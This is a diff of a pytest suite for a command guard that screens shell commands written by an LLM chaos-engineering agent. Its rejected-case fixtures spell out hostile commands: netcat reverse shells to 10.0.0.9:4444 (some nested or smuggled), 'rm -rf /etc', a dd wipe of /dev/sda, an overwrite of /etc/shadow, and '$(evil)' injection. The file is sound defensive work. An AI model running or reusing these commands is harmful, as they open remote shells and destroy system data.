-    @pytest.mark.parametrize("cmd", [
-        ["truncate", "-s", "0", "/tmp/x"],
-        ["chmod", "000", "/tmp/x"],
-        ["cp", "/tmp/a", "/tmp/b"],
-        ["ntpdate", "pool.ntp.org"],
-        ["chronyc", "makestep"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["truncate", "-s", "0", "/tmp/x"],
+            ["chmod", "000", "/tmp/x"],
+            ["cp", "/tmp/a", "/tmp/b"],
+            ["ntpdate", "pool.ntp.org"],
+            ["chronyc", "makestep"],
+        ],
+    )
     def test_tier1_commands_allowed(self, cmd):
         allowed, reason = self.guard.check(cmd)
         assert allowed is True, reason
@@ -947,10 +1275,20 @@ class TestToolGuardHostWhitelist:
 
     # ── Tier 2 — systemctl verb whitelist ──────────────────────────────
 
-    @pytest.mark.parametrize("verb", [
-        "start", "stop", "restart", "mask", "unmask",
-        "status", "is-active", "is-enabled",
-    ])
+    @pytest.mark.parametrize(
+        "verb",
+        [
+            "start",
+            "stop",
+            "restart",
+            "mask",
+            "unmask",
+            "status",
+            "is-active",
+            "is-enabled",
+            "reset-failed",
+        ],
+    )
     def test_systemctl_allowed_verbs(self, verb):
         allowed, reason = self.guard.check(["systemctl", verb, "nginx"])
         assert allowed is True, reason
@@ -960,10 +1298,21 @@ class TestToolGuardHostWhitelist:
         allowed, reason = self.guard.check(["systemctl", "--now", "stop", "nginx"])
         assert allowed is True, reason
 
-    @pytest.mark.parametrize("verb", [
-        "poweroff", "reboot", "halt", "kexec", "isolate",
-        "disable", "enable", "daemon-reload", "suspend", "hibernate",
-    ])
+    @pytest.mark.parametrize(
+        "verb",
+        [
+            "poweroff",
+            "reboot",
+            "halt",
+            "kexec",
+            "isolate",
+            "disable",
+            "enable",
+            "daemon-reload",
+            "suspend",
+            "hibernate",
+        ],
+    )
     def test_systemctl_boot_level_verbs_rejected(self, verb):
         allowed, reason = self.guard.check(["systemctl", verb, "target"])
         assert allowed is False
@@ -981,36 +1330,45 @@ class TestToolGuardHostWhitelist:
 
     # ── Tier 2 — kill PID safety ────────────────────────────────────────
 
-    @pytest.mark.parametrize("cmd", [
-        ["kill", "-9", "1234"],
-        ["kill", "-STOP", "1234"],
-        ["kill", "-CONT", "1234"],
-        ["kill", "-s", "SIGKILL", "1234"],
-        ["kill", "1234"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["kill", "-9", "1234"],
+            ["kill", "-STOP", "1234"],
+            ["kill", "-CONT", "1234"],
+            ["kill", "-s", "SIGKILL", "1234"],
+            ["kill", "1234"],
+        ],
+    )
     def test_kill_valid_pid_allowed(self, cmd):
         allowed, reason = self.guard.check(cmd)
         assert allowed is True, reason
 
-    @pytest.mark.parametrize("cmd", [
-        ["kill", "-9", "1"],     # init
-        ["kill", "1"],           # init
-        ["kill", "-1"],          # broadcast to every process
-        ["kill", "0"],           # whole process group
-        ["kill", "-9", "0"],     # process group 0
-        ["kill", "-9"],          # no PID target at all
-        ["kill", "-9", "self"],  # non-numeric target
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["kill", "-9", "1"],  # init
+            ["kill", "1"],  # init
+            ["kill", "-1"],  # broadcast to every process
+            ["kill", "0"],  # whole process group
+            ["kill", "-9", "0"],  # process group 0
+            ["kill", "-9"],  # no PID target at all
+            ["kill", "-9", "self"],  # non-numeric target
+        ],
+    )
     def test_kill_dangerous_target_rejected(self, cmd):
         allowed, reason = self.guard.check(cmd)
         assert allowed is False
 
-    @pytest.mark.parametrize("cmd", [
-        ["kill", "-9", "-123", "456"],           # signal, then a pgid
-        ["kill", "-s", "SIGKILL", "-99", "456"],  # named signal, then a pgid
-        ["kill", "-SIGTERM", "-99", "456"],
-        ["kill", "-9", "456", "-123"],            # pgid after a valid PID
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["kill", "-9", "-123", "456"],  # signal, then a pgid
+            ["kill", "-s", "SIGKILL", "-99", "456"],  # named signal, then a pgid
+            ["kill", "-SIGTERM", "-99", "456"],
+            ["kill", "-9", "456", "-123"],  # pgid after a valid PID
+        ],
+    )
     def test_kill_process_group_target_rejected(self, cmd):
         """A negative PID is the POSIX process-group form.
 
@@ -1023,10 +1381,13 @@ class TestToolGuardHostWhitelist:
         assert allowed is False
         assert "process-group" in reason
 
-    @pytest.mark.parametrize("cmd", [
-        ["kill", "-9", "456", "789"],  # two explicit PIDs is still fine
-        ["kill", "-s", "SIGKILL", "456"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["kill", "-9", "456", "789"],  # two explicit PIDs is still fine
+            ["kill", "-s", "SIGKILL", "456"],
+        ],
+    )
     def test_kill_multiple_pids_still_allowed(self, cmd):
         allowed, reason = self.guard.check(cmd)
         assert allowed is True, reason
@@ -1054,14 +1415,18 @@ class TestToolGuardHostWhitelist:
     # guard rather than by the whitelist, so the reason no longer reads
     # "not allowed". See test_guard_single_resource_binaries.py for both halves.
 
-    @pytest.mark.parametrize("cmd", [
-        ["rm", "-f", "/tmp/x"],
-        ["pkill", "-9", "nginx"],
-        ["killall", "nginx"],
-        ["socat", "-", "TCP:host:80"],
-        ["python3", "-c", "print(1)"],
-        ["bpftrace", "-e", "tracepoint:syscalls:sys_enter_open{}"],
-    ])
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # rm -f <single-file> left this list (drill cleanup tail, _check_rm);
+            # its dangerous forms are pinned in TestRmCleanupTailGuard.
+            ["pkill", "-9", "nginx"],
+            ["killall", "nginx"],
+            ["socat", "-", "TCP:host:80"],
+            ["python3", "-c", "print(1)"],
+            ["bpftrace", "-e", "tracepoint:syscalls:sys_enter_open{}"],
+        ],
+    )
     def test_still_forbidden_binaries(self, cmd):
         allowed, reason = self.guard.check(cmd)
         assert allowed is False
@@ -1117,6 +1482,803 @@ class TestToolGuardHostWhitelist:
         assert guard.check(["systemctl", "stop", "x"])[0] is False
 
 
+class TestSystemdRunTimerGuard:
+    """``systemd-run`` — admitted ONLY as a self-recovery timer.
+
+    Every host skill 降级方案 arms the same pattern ("先武装定时恢复，再注入"):
+    ``systemd-run --on-active=<N>s --unit=<name> <inverse-cmd>``. Before the
+    whitelist admission these were ALL rejected as ``unknown_binary`` while
+    the injection body (``iptables -I`` / ``kill -STOP``) passed — an
+    unexecutable-by-construction fallback plan (verified against the exact
+    commands in Host_网络故障_网络丢包隔离 / Host_进程异常_进程假死挂起).
+    """
+
+    def setup_method(self):
+        self.guard = ToolGuard()
+
+    # ── the two documented timer forms must pass ────────────────────────
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # 形式1 — payload is direct argv (网络丢包隔离: timer undoes the DROP)
+            [
+                "systemd-run",
+                "--on-active=600s",
+                "--unit=blade-restore-drop",
+                "iptables",
+                "-D",
+                "OUTPUT",
+                "-d",
+                "10.0.0.5",
+                "-j",
+                "DROP",
+            ],
+            # 形式2 — payload is a quoted ``sh -c 'kill -CONT $(…)'`` script
+            # (进程假死挂起: timer re-CONTs at the deadline). ``$(`` inside the
+            # payload is expanded by the TARGET's shell then, never here.
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-cont-nginx",
+                "sh",
+                "-c",
+                "kill -CONT $(pgrep -f nginx)",
+            ],
+            # payload = rm -f (磁盘被填满: timer reclaims the fill file — -f,
+            # not -rf, so the bulk-deletion floor is not implicated)
+            [
+                "systemd-run",
+                "--on-active=600s",
+                "--unit=blade-rmfill-host",
+                "rm",
+                "-f",
+                "/tmp/fill.dat",
+            ],
+            # payload = mv (关键文件被删除: timer moves the .orig backup back)
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-restore-filedel",
+                "mv",
+                "/etc/app.conf.orig",
+                "/etc/app.conf",
+            ],
+            # split-value flag form (systemd-run accepts ``--on-active 600s``)
+            [
+                "systemd-run",
+                "--on-active",
+                "600s",
+                "--unit=blade-restore-drop",
+                "iptables",
+                "-D",
+                "OUTPUT",
+                "-d",
+                "10.0.0.5",
+                "-j",
+                "DROP",
+            ],
+        ],
+    )
+    def test_documented_timer_forms_allowed(self, cmd):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is True, reason
+
+    # ── non-timer forms: synchronous execution = Gate-① bypass ─────────
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["systemd-run", "nginx"],
+            ["systemd-run", "iptables", "-D", "OUTPUT", "-j", "DROP"],
+            # other timer anchors exist but --on-active is the documented drill
+            # form; anything else is treated as a synchronous run
+            ["systemd-run", "--unit=x", "reboot"],
+            # --on-active carried INSIDE the payload: systemd-run stops parsing
+            # options at the first positional, so these run nginx/sh NOW and hand
+            # the flag to the payload's own argv — the timer is never armed.
+            # Review round 2 caught the checker scanning the whole argv and being
+            # satisfied by these; pinned here so the option-area boundary holds.
+            ["systemd-run", "nginx", "--on-active=600s"],
+            ["systemd-run", "sh", "-c", "--on-active=1s"],
+        ],
+    )
+    def test_non_timer_form_rejected(self, cmd):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is False
+        assert "self-recovery timer" in reason
+        assert "--on-active" in reason
+
+    def test_non_timer_rejection_is_reshapeable_not_a_dead_end(self):
+        fb = self.guard.evaluate(["systemd-run", "nginx"])
+        assert fb.is_hard_floor is False
+        assert "--on-active" in fb.compliant_form
+
+    # ── the $() exemption is payload-scoped ONLY ────────────────────────
+
+    def test_command_substitution_in_payload_exempt(self):
+        """The exemption exists because the payload runs at the DEADLINE —
+        the TARGET's shell expands ``$(pgrep -f nginx)`` then. Pinned so a
+        future refactor of Gate ② cannot silently re-break the skill path."""
+        cmd = [
+            "systemd-run",
+            "--on-active=300s",
+            "--unit=blade-cont-nginx",
+            "sh",
+            "-c",
+            "kill -CONT $(pgrep -f nginx)",
+        ]
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is True, reason
+
+    def test_command_substitution_in_flag_still_blocked(self):
+        """A flag token is NOT payload: ``$(`` there is expanded by nobody
+        and stays a hard floor."""
+        allowed, reason = self.guard.check(
+            [
+                "systemd-run",
+                "--on-active=600s",
+                "--unit=x$(evil)",
+                "iptables",
+                "-D",
+                "OUTPUT",
+                "-j",
+                "DROP",
+            ]
+        )
+        assert allowed is False
+        assert "Dangerous pattern" in reason
+
+    def test_identical_flag_and_payload_text_still_blocks_flag(self):
+        """Exemption matching is by token text, so a payload token IDENTICAL
+        to a flag token must not exempt the flag-area copy — the option area
+        is never payload, whatever the payload spells.
+
+        Post-readmission the payload ``sh -c '--unit=$(evil)'`` is itself
+        rejected FIRST (its script head is no whitelisted binary) — the
+        command stays blocked, now one gate earlier."""
+        allowed, reason = self.guard.check(
+            [
+                "systemd-run",
+                "--on-active=600s",
+                "--unit=$(evil)",
+                "sh",
+                "-c",
+                "--unit=$(evil)",
+            ]
+        )
+        assert allowed is False
+        assert "not allowed" in reason
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # quoted single-token payload: the _check_rm replay owns this form now
+            ["systemd-run", "--on-active=600s", "--unit=x", "sh", "-c", "rm -rf /etc"],
+            # raw block-device write as the timer payload: dd is in no
+            # whitelist, so the payload-region readmission itself rejects it
+            # (UNKNOWN_BINARY hard floor — the same verdict a direct `dd` gets)
+            [
+                "systemd-run",
+                "--on-active=600s",
+                "--unit=x",
+                "dd",
+                "if=/dev/zero",
+                "of=/dev/sda",
+            ],
+        ],
+    )
+    def test_destructive_payload_still_blocked(self, cmd):
+        """The payload genuinely executes eventually, so every destructive
+        form still fires on it — post-readmission the ``rm -rf`` form is
+        owned by the _check_rm replay (the same rejected-and-reshapeable
+        verdict the direct execution gets), while raw-device writes stay on
+        the Gate ② hard floor."""
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        if cmd[3] == "sh":
+            assert fb.is_hard_floor is False
+            assert fb.reason.startswith("timer payload:")
+        else:
+            assert fb.is_hard_floor is True
+
+    def test_bare_sh_still_rejected(self):
+        """Interpreters are in no whitelist — the timer payload's ``sh -c``
+        rides INSIDE systemd-run; a bare one is still an unknown binary."""
+        allowed, reason = self.guard.check(
+            ["sh", "-c", "kill -CONT $(pgrep -f nginx)"],
+        )
+        assert allowed is False
+        assert "not allowed" in reason
+
+
+class TestTimerPayloadReadmission:
+    """Payload-region readmission: the command riding in a carrier's argv
+    meets the SAME Gate ① whitelist and Gate ③ per-binary checkers a
+    directly-executed command meets.
+
+    The hole this pins shut: Gate ①/③ keyed on ``cmd[0]`` alone, so a timer
+    payload of ``python /tmp/x.py`` / ``nc -e …`` executed at the deadline
+    having met neither — only the blacklist regexes, whose vocabulary does
+    not include "not whitelisted" binaries."""
+
+    def setup_method(self):
+        self.guard = ToolGuard()
+
+    # ── the legal payload forms the host skills teach (all admitted) ────
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # disk-fill cleanup tail: bare rm -f argv
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-clean",
+                "rm",
+                "-f",
+                "/tmp/app-archive.log",
+            ],
+            # network-drop restore: bare iptables argv
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-restore-net",
+                "iptables",
+                "-D",
+                "OUTPUT",
+                "-d",
+                "10.0.0.5",
+                "-j",
+                "DROP",
+            ],
+            # port-occupy restore: sh -c quoted script
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-restore-port",
+                "sh",
+                "-c",
+                "iptables -D OUTPUT -p tcp --dport 8080 -j DROP",
+            ],
+            # process CONT: kill + $(pidof/pgrep) — the dynamic-PID legal form
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-cont-kubeproxy",
+                "sh",
+                "-c",
+                "kill -CONT $(pidof kube-proxy)",
+            ],
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-cont-nginx",
+                "sh",
+                "-c",
+                "kill -CONT $(pgrep -f nginx)",
+            ],
+            # CNI CONT: || chain INSIDE $() (every branch a PID probe)
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-cont-cni",
+                "sh",
+                "-c",
+                "kill -CONT $(pidof terway-daemon || pidof cilium-agent || pidof calico-node)",
+            ],
+            # NTP restore: ; + || true + 2>/dev/null redirect
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-restore-clock",
+                "sh",
+                "-c",
+                "systemctl start chronyd; chronyc makestep 2>/dev/null || true",
+            ],
+            # tamper restore: cp && rm tail
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-restore-filecontent",
+                "sh",
+                "-c",
+                "cp /etc/hosts.bak /etc/hosts && rm -f /etc/hosts.bak",
+            ],
+            # DNS restore: ; + backslash-newline continuation (doc multiline form)
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=blade-restore-dnsnat",
+                "sh",
+                "-c",
+                "iptables -t nat -D OUTPUT -p udp --dport 53 -j DNAT "
+                "--to-destination 10.0.0.9:53; \\\n   iptables -t nat -D OUTPUT -p tcp --dport 53 -j DNAT "
+                "--to-destination 10.0.0.9:53",
+            ],
+        ],
+    )
+    def test_legal_skill_payload_forms_admitted(self, cmd):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is True, reason
+
+    # ── the hole matrix: everything that used to sail through ─────────
+    @pytest.mark.parametrize(
+        ("cmd", "fragment"),
+        [
+            # non-whitelisted binaries (the original hole)
+            (
+                ["systemd-run", "--on-active=1s", "--unit=x", "python", "/tmp/x.py"],
+                "not allowed: python",
+            ),
+            (
+                ["systemd-run", "--on-active=0s", "--unit=x", "python", "/tmp/x.py"],
+                "not allowed: python",
+            ),
+            (
+                ["systemd-run", "--on-active=1s", "--unit=x", "nginx"],
+                "not allowed: nginx",
+            ),
+            # interpreter running a script FILE (contents invisible to every gate)
+            (
+                ["systemd-run", "--on-active=1s", "--unit=x", "bash", "/tmp/evil.sh"],
+                "interpreter form",
+            ),
+            # per-binary checkers replay on the payload head
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "chmod",
+                    "-R",
+                    "777",
+                    "/etc",
+                ],
+                "timer payload: chmod recursive",
+            ),
+            (
+                ["systemd-run", "--on-active=1s", "--unit=x", "rm", "-r", "/var/log"],
+                "timer payload: rm",
+            ),
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "nc",
+                    "-e",
+                    "/bin/sh",
+                    "10.0.0.9",
+                    "4444",
+                ],
+                "timer payload: nc",
+            ),
+            # script-form warheads
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "sh",
+                    "-c",
+                    "nc -e /bin/sh 10.0.0.9 4444",
+                ],
+                "timer payload: nc",
+            ),
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "sh",
+                    "-c",
+                    "sh -c 'nc -e /bin/sh 10.0.0.9 4444'",
+                ],
+                "nests an interpreter",
+            ),
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "sh",
+                    "-c",
+                    "systemd-run --on-active=1s python /tmp/x.py",
+                ],
+                "nests carrier",
+            ),
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "sh",
+                    "-c",
+                    "(nc -e /bin/sh 10.0.0.9 4444)",
+                ],
+                "subshell",
+            ),
+            # $(...) bodies: PID probes only — a probe's output must not smuggle
+            # flags or arbitrary commands into the outer argv
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "sh",
+                    "-c",
+                    "kill -CONT $(nc -e /bin/sh 10.0.0.9 4444)",
+                ],
+                "$(...) body",
+            ),
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "sh",
+                    "-c",
+                    "chmod $(echo -R) 777 /etc",
+                ],
+                # rejected one gate EARLIER than the $()-body recursion: a
+                # dynamic argument on non-kill commands is refused outright,
+                # so the smuggled -R never even reaches the echo probe check
+                "dynamic argument",
+            ),
+            # nested carrier, argv form (recursion through the replay)
+            (
+                [
+                    "systemd-run",
+                    "--on-active=1s",
+                    "--unit=x",
+                    "systemd-run",
+                    "--on-active=1s",
+                    "python",
+                    "/tmp/x.py",
+                ],
+                "not allowed: python",
+            ),
+            # nothing armed at all
+            (["systemd-run", "--on-active=300s", "--unit=x"], "empty"),
+        ],
+    )
+    def test_warheads_rejected(self, cmd, fragment):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is False
+        assert fragment in reason
+
+    def test_redirect_to_real_file_rejected(self):
+        """The one redirect the skills teach is ``2>/dev/null``; a payload
+        writing to a real file is no recovery step and fails closed."""
+        allowed, reason = self.guard.check(
+            [
+                "systemd-run",
+                "--on-active=300s",
+                "--unit=x",
+                "sh",
+                "-c",
+                "cp /etc/hosts.bak /etc/hosts > /etc/shadow",
+            ]
+        )
+        assert allowed is False
+        assert "non-sink" in reason
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            # an EVEN backslash run leaves the newline a command SEPARATOR:
+            # bash really runs `echo a\` then `rm -f /tmp/x` as a second
+            # command, while the continuation fold would splice them into
+            # one `echo a\rm …` segment — the rm escapes the segment check
+            "echo a\\\\\nrm -f /tmp/x",
+            # four backslashes: same even-run ambiguity
+            "echo a\\\\\\\\\nrm -rf /etc",
+        ],
+    )
+    def test_multi_backslash_newline_rejected(self, script):
+        """2+ backslashes before a newline fail closed: the fold cannot
+        mirror bash's left-to-right escape pairing for even runs, and no
+        skill form uses the pattern."""
+        allowed, reason = self.guard.check(
+            ["systemd-run", "--on-active=1s", "--unit=x", "sh", "-c", script]
+        )
+        assert allowed is False
+        assert "backslashes before a newline" in reason
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            # variable expansion: $MODE from the environment feeds the mode
+            # slot — a MODE=-R there is a recursive chmod the literal-structure
+            # checker cannot see
+            "chmod $MODE 777 /etc",
+            # $() widening: pidof's multi-PID output widens `rm -f` past the
+            # single-file form the direct-execution checker enforces
+            "rm -f $(pidof nginx)",
+            # plain variable on a file operand
+            "rm -f $HOME/x",
+        ],
+    )
+    def test_dynamic_argument_off_kill_rejected(self, script):
+        """A dynamic word (value=None: ``$(…)`` / ``$VAR``) is admitted only
+        on kill's PID operand. Everywhere else it expands INTO the command's
+        argv on the target, bypassing the checker's literal-structure
+        judgment."""
+        allowed, reason = self.guard.check(
+            ["systemd-run", "--on-active=1s", "--unit=x", "sh", "-c", script]
+        )
+        assert allowed is False
+        assert "dynamic argument" in reason
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            # kill's PID operand is the payloads' ONE legal dynamic slot
+            "kill -CONT $PID",
+            "kill -CONT $(pgrep -f nginx)",
+            # backtick bodies are script parts too — the vetted old-style
+            # substitution form stays admitted (its body gets the same
+            # PID-probe recursion below)
+            "kill -CONT `pidof nginx`",
+            # quoted and escaped literals carry a bashfacts value — they are
+            # NOT dynamic words and must keep flowing into the replay
+            "cp '/tmp/a b' /tmp/c",
+            "rm -f /tmp/a\\ b",
+        ],
+    )
+    def test_legal_dynamic_and_quoted_forms_admitted(self, script):
+        """The dynamic-word tightening leaves kill's PID slot (both the
+        ``$PID`` variable and the vetted ``$(…)`` probe) and every literal
+        form — quoted or escaped — untouched."""
+        allowed, reason = self.guard.check(
+            ["systemd-run", "--on-active=1s", "--unit=x", "sh", "-c", script]
+        )
+        assert allowed is True, reason
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            # arithmetic nesting: bashfacts parses $((…)) as ONE opaque word
+            # with NO script part, so a backtick riding inside it executes on
+            # the target while the $()-body recursion never sees it
+            "kill -CONT $((`nc -e /bin/sh 10.0.0.9 4444`))",
+            # plain arithmetic: harmless in itself, but outside the reviewed
+            # grammar — fail closed alongside the nesting case
+            "kill -CONT $((1+1))",
+            # parameter expansion shares the same opacity argument
+            "kill -CONT ${PID:-123}",
+        ],
+    )
+    def test_kill_arithmetic_or_param_operands_rejected(self, script):
+        """kill's dynamic operand admits exactly two vetted shapes: a script
+        part (``$(…)``/backtick, recursively probed) or a bare ``$VAR``.
+        Arithmetic and parameter-expanded operands are opaque to bashfacts
+        and fail closed."""
+        allowed, reason = self.guard.check(
+            ["systemd-run", "--on-active=1s", "--unit=x", "sh", "-c", script]
+        )
+        assert allowed is False
+        assert "PID probe or a bare $VAR" in reason
+
+    def test_nested_carriers_recurse_closed(self):
+        """Carriers inside carriers re-enter the same readmission at every
+        depth — no layer of nesting lets a non-whitelisted binary through."""
+        for cmd in (
+            # timer payload whose argv head is itself a wiz exec carrier
+            [
+                "systemd-run",
+                "--on-active=1s",
+                "--unit=x",
+                "wiz",
+                "task",
+                "exec",
+                "--command",
+                "python /tmp/x.py",
+            ],
+            # wiz --command whose value is itself a timer payload
+            [
+                "wiz",
+                "task",
+                "exec",
+                "--command",
+                "systemd-run --on-active=1s python /tmp/x.py",
+            ],
+        ):
+            allowed, reason = self.guard.check(cmd)
+            assert allowed is False, reason
+            assert "not allowed: python" in reason
+
+
+class TestWizCommandGuard:
+    """``wiz task exec --command`` — the remote-exec carrier's value region
+    goes through the same payload gates (the wiz twin of the timer-payload
+    hole). Channel-assembled wiz calls never reach the guard; only an
+    LLM-authored argv starting with ``wiz`` does."""
+
+    def setup_method(self):
+        self.guard = ToolGuard()
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # legal remote command: whitelisted binary, argv form
+            [
+                "wiz",
+                "task",
+                "exec",
+                "--command",
+                "kubectl get pods",
+                "--cluster-uuid",
+                "c63",
+                "--timeout",
+                "90",
+            ],
+            # legal sh -c form with a vetted $() (PID probe)
+            [
+                "wiz",
+                "task",
+                "exec",
+                "--command",
+                "sh -c 'kill -CONT $(pgrep -f nginx)'",
+            ],
+        ],
+    )
+    def test_legal_command_values_admitted(self, cmd):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is True, reason
+
+    def test_wiz_without_command_flag_passes(self):
+        """Non-exec shapes (task list / login / …) carry nothing — not this
+        checker's business."""
+        allowed, reason = self.guard.check(["wiz", "task", "list"])
+        assert allowed is True, reason
+
+    def test_trailing_command_flag_missing_value_rejected(self):
+        """A ``--command`` with no value token is a malformed exec shape —
+        fail closed rather than admit a carrier whose payload region is
+        unspecified (non-exec shapes never spell ``--command``)."""
+        allowed, reason = self.guard.check(["wiz", "task", "exec", "--command"])
+        assert allowed is False
+        assert "missing its value" in reason
+
+    @pytest.mark.parametrize(
+        ("cmd", "fragment"),
+        [
+            (
+                ["wiz", "task", "exec", "--command", "python /tmp/x.py"],
+                "not allowed: python",
+            ),
+            (
+                ["wiz", "task", "exec", "--command", "nc -e /bin/sh 10.0.0.9 4444"],
+                "wiz task exec --command payload: nc",
+            ),
+            # --command= spelling
+            (
+                ["wiz", "task", "exec", "--command=python /tmp/x.py"],
+                "not allowed: python",
+            ),
+            # interpreter running a script file
+            (
+                ["wiz", "task", "exec", "--command", "bash /tmp/evil.sh"],
+                "interpreter form",
+            ),
+            # even backslash run before a newline: the fold would splice the
+            # next command into the current word — same hole as the timer
+            # payload's, same fail-closed answer
+            (
+                [
+                    "wiz",
+                    "task",
+                    "exec",
+                    "--command",
+                    "sh -c 'echo a\\\\\nrm -f /tmp/x'",
+                ],
+                "backslashes before a newline",
+            ),
+        ],
+    )
+    def test_warhead_values_rejected(self, cmd, fragment):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is False
+        assert fragment in reason
+
+
+class TestRmCleanupTailGuard:
+    """``rm`` — the drill-artifact cleanup tail (host twin of
+    ``kubectl delete <debug-pod>``), narrowed to ``rm -f <single-file>``."""
+
+    def setup_method(self):
+        self.guard = ToolGuard()
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # 关键文件被篡改: manual early-recovery tail after restoring content
+            ["rm", "-f", "/etc/app.conf.bak"],
+            # 磁盘被填满: fill file the drill itself created
+            ["rm", "-f", "/var/log/app-archive.dat"],
+        ],
+    )
+    def test_skill_cleanup_tail_allowed(self, cmd):
+        allowed, reason = self.guard.check(cmd)
+        assert allowed is True, reason
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            ["rm", "-rf", "/etc"],  # combined recursive flag, split tokens
+            ["rm", "-fr", "/etc"],  # reversed combination
+            ["rm", "-r", "/etc"],
+            ["rm", "-R", "/data"],
+            ["rm", "--recursive", "/data"],
+            ["rm", "-f", "-r", "/etc"],  # recursive sneaking in as 2nd flag
+            ["rm", "/etc/app.conf.bak"],  # no -f: not the idempotent tail form
+            ["rm", "-f", "/a", "/b"],  # multiple paths: no single boundary
+            ["rm", "-f", "/var/log/"],  # trailing slash = directory target
+            ["rm"],  # nothing at all
+        ],
+    )
+    def test_everything_else_rejected(self, cmd):
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert "rm -f" in fb.reason
+
+    def test_recursive_rejection_is_reshapeable_not_a_dead_end(self):
+        fb = self.guard.evaluate(["rm", "-rf", "/etc"])
+        assert fb.is_hard_floor is False
+        assert "rm -f" in fb.compliant_form
+
+    def test_quoted_rm_rf_in_timer_payload_rejected_by_replay(self):
+        """A timer payload ``sh -c 'rm -rf /etc'`` is rejected by the _check_rm
+        REPLAY with the same verdict the direct execution gets — rejected and
+        reshapeable (``rm -f <file>`` is the legal tail). The pre-readmission
+        hard floor came from the Gate ② blacklist regex, which the checker
+        replay now pre-empts for rm forms; the rejection itself never went
+        away."""
+        fb = self.guard.evaluate(
+            [
+                "systemd-run",
+                "--on-active=600s",
+                "--unit=x",
+                "sh",
+                "-c",
+                "rm -rf /etc",
+            ]
+        )
+        assert fb.allowed is False
+        assert fb.is_hard_floor is False
+        assert fb.reason.startswith("timer payload:")
+
+
+class TestKubectlReplaceRestoreVerb:
+    """``kubectl replace`` — the only exactly-restoring verb the PVC /
+    limits / topology cases teach for their baseline restore."""
+
+    def setup_method(self):
+        self.guard = ToolGuard()
+
+    def test_replace_baseline_restore_allowed(self):
+        allowed, reason = self.guard.check(
+            ["kubectl", "replace", "-f", "/tmp/blade-topology-baseline.json"],
+        )
+        assert allowed is True, reason
+
+    def test_step_verb_superset_invariant_covers_replace(self):
+        """KUBECTL_ALLOWED_SUBCOMMANDS ⊇ step_kubectl_verbs — the invariant
+        test would catch a regression, this pins the intent explicitly."""
+        from chaos_agent.agent.providers.k8s_native.provider import K8sNativeProvider
+
+        assert "replace" in K8sNativeProvider.step_kubectl_verbs
+        assert "replace" not in K8sNativeProvider.inject_kubectl_subcommands
+
+    def test_still_refused_verbs_unchanged(self):
+        for verb in ("edit", "run", "proxy"):
+            allowed, reason = self.guard.check(
+                ["kubectl", verb, "deployment/app"],
+            )
+            assert allowed is False, verb
+
+
 class TestToolGuardWizUnwrap:
     """kubewiz mode: ``wiz task exec --command "<kubectl ...>"`` unwrap.
 
@@ -1134,8 +2296,15 @@ class TestToolGuardWizUnwrap:
 
     def _wiz(self, inner: str) -> list[str]:
         return [
-            "wiz", "task", "exec", "--command", inner,
-            "--cluster-uuid", "uuid-1", "--profile", "default",
+            "wiz",
+            "task",
+            "exec",
+            "--command",
+            inner,
+            "--cluster-uuid",
+            "uuid-1",
+            "--profile",
+            "default",
         ]
 
     # ── core fix ──────────────────────────────────────
@@ -1153,8 +2322,16 @@ class TestToolGuardWizUnwrap:
     def test_wiz_and_kubeconfig_equivalent(self):
         """Same logical command in both modes yields the same verdict."""
         kubeconfig_cmd = [
-            "kubectl", "debug", "node/n1", "-it", "--image=ubuntu", "--",
-            "chroot", "/host", "sh", "-c",
+            "kubectl",
+            "debug",
+            "node/n1",
+            "-it",
+            "--image=ubuntu",
+            "--",
+            "chroot",
+            "/host",
+            "sh",
+            "-c",
             "iptables -I INPUT -j DROP >/dev/null 2>&1",
         ]
         inner = (
